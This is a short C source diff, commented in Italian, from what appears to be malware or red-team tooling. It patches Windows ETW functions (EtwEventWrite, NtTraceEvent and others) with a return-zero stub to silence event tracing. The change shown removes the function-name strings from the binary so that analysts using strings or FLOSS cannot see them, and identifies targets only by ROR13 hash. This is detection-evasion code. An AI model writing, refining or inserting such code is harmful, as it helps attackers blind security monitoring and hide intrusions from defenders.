@@ -24,21 +24,23 @@ static const BYTE etw_patch[]    = { 0x33, 0xC0, 0xC3 };
 static const SIZE_T etw_patch_sz = 3;
 #endif
 
-/* ── Struttura per salvataggio byte originali ─────────────────────── */
+/* ── Struttura per salvataggio byte originali ───────────────────────
+ * NOTA: nessun campo 'name' — le stringhe dei nomi ETW non devono
+ * finire nel binario (sarebbero visibili con strings/FLOSS).
+ * L'identificazione avviene solo tramite hash ROR13. */
 typedef struct _ETW_PATCH_ENTRY {
-    const char *name;
     PVOID       addr;
     BYTE        original[8];
     BOOL        patched;
 } ETW_PATCH_ENTRY;
 
 static ETW_PATCH_ENTRY g_etw_targets[] = {
-    { "EtwEventWrite",         NULL, {0}, FALSE },
-    { "EtwEventWriteEx",       NULL, {0}, FALSE },
-    { "EtwEventWriteFull",     NULL, {0}, FALSE },
-    { "EtwEventWriteString",   NULL, {0}, FALSE },
-    { "EtwEventWriteTransfer", NULL, {0}, FALSE },
-    { "NtTraceEvent",          NULL, {0}, FALSE },
+    { NULL, {0}, FALSE },   /* [0] EtwEventWrite         */
+    { NULL, {0}, FALSE },   /* [1] EtwEventWriteEx       */
+    { NULL, {0}, FALSE },   /* [2] EtwEventWriteFull     */
+    { NULL, {0}, FALSE },   /* [3] EtwEventWriteString   */
+    { NULL, {0}, FALSE },   /* [4] EtwEventWriteTransfer */
+    { NULL, {0}, FALSE },   /* [5] NtTraceEvent          */
 };
 static const DWORD g_etw_count =
     sizeof(g_etw_targets) / sizeof(g_etw_targets[0]);
